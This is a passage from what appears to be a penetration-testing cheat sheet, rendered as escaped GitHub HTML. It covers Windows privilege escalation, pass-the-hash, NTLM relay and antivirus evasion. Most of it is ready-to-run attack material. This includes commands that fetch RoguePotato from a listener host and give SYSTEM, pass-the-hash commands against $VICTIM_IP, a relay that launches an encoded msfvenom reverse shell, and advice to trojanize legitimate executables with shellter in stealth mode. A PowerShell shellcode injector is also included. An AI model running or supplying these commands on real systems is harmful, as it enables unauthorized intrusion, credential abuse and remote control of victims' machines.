binary\u003c/span\u003e\niwr \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003euri http:\u003cspan class=\"pl-k\"\u003e//\u003c/span\u003eLISTEN_IP\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eRoguePotato.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eOutfile \u003cspan class=\"pl-c1\"\u003eRoguePotato.exe\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e run the exploit\u003c/span\u003e\n.\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eRoguePotato.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003el \u003cspan class=\"pl-c1\"\u003e9999\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ee \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eC:\\Users\\Public\\revshell.exe\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003er LISTEN_IP\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e and bingo! you should have system on the listener you set up!\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.2.7 Windows Pass-The-Hash Attacks\u003c/h3\u003e\u003ca id=\"user-content-427-windows-pass-the-hash-attacks\" class=\"anchor\" aria-label=\"Permalink: 4.2.7 Windows Pass-The-Hash Attacks\" href=\"#427-windows-pass-the-hash-attacks\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThere are lots of ways to pass the hash on windows, giving you access as a user\nwith just the hash of their creds.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eSee \u003ca href=\"#5.10.5%20Grabbing%20Hashes%20from%20Windows\"\u003eGrabbing Hashes from Windows\u003c/a\u003e for techniques on grabbing Windows password hashes.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eNote: Windows NTLM hashes are in the form LMHASH:NTHASH. That convention is used here.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Get remote powershell shell by passing the hash\n# install: sudo apt install evil-winrm\nevil-winrm -i $VICTIM_IP -u username -H NTHASH\n\n# Run remote command as SYSTEM (note colon before NT hash)\nimpacket-psexec -hashes :NTHASH [DOMAIN/]administrator@$VICTIM_IP [whoami]\n# omit the command to get interactive shell\n\n# Run remote command as Administrator; same syntax as psexec\nimpacket-wmiexec -hashes :NTHASH [DOMAIN/]Administrator@$VICTIM_IP\n\n# execute remote command as Admin (IP MUST GO LAST!)\ncrackmapexec smb -d DOMAIN -u Administrator -H LMHASH:NTHASH -x whoami $VICTIM_IP\n\n# spawn cmd.exe shell on remote windows box\n# replace 'admin' with username, 'hash' with full LM-NTLM hash (colon-separated)\npth-winexe -U 'admin%hash' //WINBOX_IP cmd.exe\n\n# other options for PtH: xfreerdp, smbclient\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Get remote powershell shell by passing the hash\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e install: sudo apt install evil-winrm\u003c/span\u003e\nevil-winrm -i \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e -u username -H NTHASH\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Run remote command as SYSTEM (note colon before NT hash)\u003c/span\u003e\nimpacket-psexec -hashes :NTHASH [DOMAIN/]administrator@\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e [whoami]\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e omit the command to get interactive shell\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Run remote command as Administrator; same syntax as psexec\u003c/span\u003e\nimpacket-wmiexec -hashes :NTHASH [DOMAIN/]Administrator@\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e execute remote command as Admin (IP MUST GO LAST!)\u003c/span\u003e\ncrackmapexec smb -d DOMAIN -u Administrator -H LMHASH:NTHASH -x whoami \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e spawn cmd.exe shell on remote windows box\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e replace 'admin' with username, 'hash' with full LM-NTLM hash (colon-separated)\u003c/span\u003e\npth-winexe -U \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eadmin%hash\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e //WINBOX_IP cmd.exe\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e other options for PtH: xfreerdp, smbclient\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.2.8 Windows NTLMv2 Hash Relay Attack\u003c/h3\u003e\u003ca id=\"user-content-428-windows-ntlmv2-hash-relay-attack\" class=\"anchor\" aria-label=\"Permalink: 4.2.8 Windows NTLMv2 Hash Relay Attack\" href=\"#428-windows-ntlmv2-hash-relay-attack\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWhen you can't crack an NTLMv2 hash that you were able to capture with Responder, you can relay it to another machine for access/RCE (assuming it's an admin hash, and Remote UAC restrictions are disabled on the target). If this works, you get instant SYSTEM on the remote machine.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# '-c' flag is command to run\n# here we are generating a powershell reverse shell one-liner\n# as base64-encoded command\nsudo impacket-ntlmrelayx -t VICTIM_IP --no-http-server -smb2support -c \u0026quot;powershell -enc $(msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=tun0 | iconv -t UTF-16LE | base64 | tr -d '\\n')\u0026quot;\n\n# start a netcat listener to catch the reverse shell\nsudo nc -nvlp 443\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '-c' flag is command to run\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e here we are generating a powershell reverse shell one-liner\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e as base64-encoded command\u003c/span\u003e\nsudo impacket-ntlmrelayx -t VICTIM_IP --no-http-server -smb2support -c \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003epowershell -enc \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003emsfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=tun0 \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e iconv -t UTF-16LE \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e base64 \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e tr -d \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\\n\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start a netcat listener to catch the reverse shell\u003c/span\u003e\nsudo nc -nvlp 443\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.3 Antivirus \u0026amp; Firewall Evasion\u003c/h2\u003e\u003ca id=\"user-content-43-antivirus--firewall-evasion\" class=\"anchor\" aria-label=\"Permalink: 4.3 Antivirus \u0026amp; Firewall Evasion\" href=\"#43-antivirus--firewall-evasion\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAdvanced Evasion techniques:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/\" rel=\"nofollow\"\u003ehttps://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://web.archive.org/web/20210317102554/https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf\" rel=\"nofollow\"\u003ehttps://web.archive.org/web/20210317102554/https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.3.1 Cross-Compiling Windows Binaries on Linux\u003c/h3\u003e\u003ca id=\"user-content-431-cross-compiling-windows-binaries-on-linux\" class=\"anchor\" aria-label=\"Permalink: 4.3.1 Cross-Compiling Windows Binaries on Linux\" href=\"#431-cross-compiling-windows-binaries-on-linux\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou can use \u003ccode\u003emingw\u003c/code\u003e to cross-compile C files.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# make sure you link Winsock with `-lws2_32` when using winsock.h\ni686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32\n\n# you can test that windows EXE's run as expected by using 'wine':\nwine syncbreeze_exploit.exe\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e make sure you link Winsock with `-lws2_32` when using winsock.h\u003c/span\u003e\ni686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e you can test that windows EXE's run as expected by using 'wine':\u003c/span\u003e\nwine syncbreeze_exploit.exe\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://www.monodevelop.com/download/\" rel=\"nofollow\"\u003eMonoDevelop\u003c/a\u003e is a cross-platform IDE for C# and .NET.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.3.2 Shellter\u003c/h3\u003e\u003ca id=\"user-content-432-shellter\" class=\"anchor\" aria-label=\"Permalink: 4.3.2 Shellter\" href=\"#432-shellter\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou can use \u003ccode\u003eshellter\u003c/code\u003e to inject a malicious payload into a legitimate Windows 32-bit executable. Just run \u003ccode\u003eshellter\u003c/code\u003e in the terminal and follow the prompts. Recommend using \u003ccode\u003estealth\u003c/code\u003e mode so it doesn't alert the user. The paid version of \u003ccode\u003eshellter\u003c/code\u003e supports 64-bit executables.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eTo check that your exploit works:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# start listener for reverse shell\nsudo nc -lvnp 443\n\n# run shellter-injected binary with wine\nwine derp.exe\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start listener for reverse shell\u003c/span\u003e\nsudo nc -lvnp 443\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e run shellter-injected binary with wine\u003c/span\u003e\nwine derp.exe\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNOTE:\u003c/strong\u003e I've had issues using the binaries under \u003ccode\u003e/usr/share/windows-resources/binaries/\u003c/code\u003e, so download something like PuTTY from the internet instead. Make sure you get the 32-bit version of whatever binary you grab.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.3.3 Windows Process Injection\u003c/h3\u003e\u003ca id=\"user-content-433-windows-process-injection\" class=\"anchor\" aria-label=\"Permalink: 4.3.3 Windows Process Injection\" href=\"#433-windows-process-injection\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThe general technique for injecting shellcode into another (running) process goes like this:\u003c/p\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003e\u003cem\u003e\u003cstrong\u003eOpenProcess\u003c/strong\u003e\u003c/em\u003e - Get a HANDLE to a target process that you have permissions to access\u003c/li\u003e\n\u003cli\u003e\u003cem\u003e\u003cstrong\u003eVirtualAllocEx\u003c/strong\u003e\u003c/em\u003e - Allocate memory within the target process\u003c/li\u003e\n\u003cli\u003e\u003cem\u003e\u003cstrong\u003eWriteProcessMemory\u003c/strong\u003e\u003c/em\u003e - Copy your shellcode into the target process's memory\u003c/li\u003e\n\u003cli\u003e\u003cem\u003e\u003cstrong\u003eCreateRemoteThread\u003c/strong\u003e\u003c/em\u003e - Start execution of your shellcode in new thread running within target process\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp dir=\"auto\"\u003eThese are the most common Windows APIs used to accomplish this, but there are \u003ca href=\"https://malapi.io/\" rel=\"nofollow\"\u003emany other alternatives\u003c/a\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eHere is a PowerShell implementation of a simple \"process injector\" that injects the shellcode into itself and runs it:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"$imports = '\n[DllImport(\u0026quot;kernel32.dll\u0026quot;)]\npublic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n[DllImport(\u0026quot;kernel32.dll\u0026quot;)]\npublic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n[DllImport(\u0026quot;msvcrt.dll\u0026quot;)]\npublic static extern IntPtr memset(IntPtr dest, uint src, uint count);';\n\n$w = Add-Type -memberDefinition $imports -Name \u0026quot;derp\u0026quot; -namespace Win32Functions -passthru;\n\n# msfvenom -p windows/shell_reverse_tcp -f powershell -v s LPORT=443 LHOST=tun0\n[Byte[]];\n[Byte[]]$s = \u0026lt;SHELLCODE HERE\u0026gt;;\n\n$size = 0x1000;\n\nif ($s.Length -gt 0x1000) {$size = $s.Length};\n\n$x = $w::VirtualAlloc(0,$size,0x3000,0x40);\n\nfor ($i=0;$i -le ($s.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $s[$i], 1)};\n\n$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };\"\u003e\u003cpre\u003e\u003cspan class=\"pl-smi\"\u003e$imports\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e[DllImport(\"kernel32.dll\")]\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003epublic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e[DllImport(\"kernel32.dll\")]\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003epublic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e[DllImport(\"msvcrt.dll\")]\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003epublic static extern IntPtr memset(IntPtr dest, uint src, uint count);\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\n\u003cspan class=\"pl-smi\"\u003e$w\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eAdd-Type\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ememberDefinition \u003cspan class=\"pl-smi\"\u003e$imports\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eName \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ederp\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003enamespace Win32Functions \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003epassthru;\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e msfvenom -p windows/shell_reverse_tcp -f powershell -v s LPORT=443 LHOST=tun0\u003c/span\u003e\n[\u003cspan class=\"pl-k\"\u003eByte\u003c/span\u003e[]];\n[\u003cspan class=\"pl-k\"\u003eByte\u003c/span\u003e[]]\u003cspan class=\"pl-smi\"\u003e$s\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003eSHELLCODE HERE\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e;\n\n\u003cspan class=\"pl-smi\"\u003e$size\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0x1000\u003c/span\u003e;\n\n\u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e (\u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.Length\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-gt\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0x1000\u003c/span\u003e) {\u003cspan class=\"pl-smi\"\u003e$size\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.Length\u003c/span\u003e\u003c/span\u003e};\n\n\u003cspan class=\"pl-smi\"\u003e$x\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$w\u003c/span\u003e::VirtualAlloc(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$size\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0x3000\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0x40\u003c/span\u003e);\n\n\u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e (\u003cspan class=\"pl-smi\"\u003e$i\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e;\u003cspan class=\"pl-smi\"\u003e$i\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-le\u003c/span\u003e (\u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.Length\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e);\u003cspan class=\"pl-smi\"\u003e$i\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e++\u003c/span\u003e) {\u003cspan class=\"pl-smi\"\u003e$w\u003c/span\u003e::memset([\u003cspan class=\"pl-k\"\u003eIntPtr\u003c/span\u003e](\u003cspan class=\"pl-smi\"\u003e$x\u003cspan class=\"pl-smi\"\u003e.ToInt32\u003c/span\u003e\u003c/span\u003e()\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$i\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$s\u003c/span\u003e[\u003cspan class=\"pl-smi\"\u003e$i\u003c/span\u003e]\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e)};\n\n\u003cspan class=\"pl-smi\"\u003e$w\u003c/span\u003e::CreateThread(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$x\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e);\u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e (;;) { \u003cspan class=\"pl-c1\"\u003eStart-sleep\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e60\u003c/span\u003e };\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.3.4 Windows AMSI Bypass\u003c/h3\u003e\u003ca id=\"user-content-434-windows-amsi-bypass\" 